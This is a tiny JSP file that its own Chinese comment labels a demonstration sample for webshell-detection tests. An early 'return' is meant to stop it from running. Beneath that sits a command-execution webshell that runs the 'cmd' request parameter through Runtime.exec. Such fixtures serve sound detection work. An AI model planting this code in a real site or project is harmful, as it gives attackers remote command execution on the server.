<%--
  ！！演示样本文件，仅用于 webshell 检测测试，请勿部署到任何服务器！！
  文件开头 return 保证脚本不会真正执行。
--%>
<% return; %>
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
%>
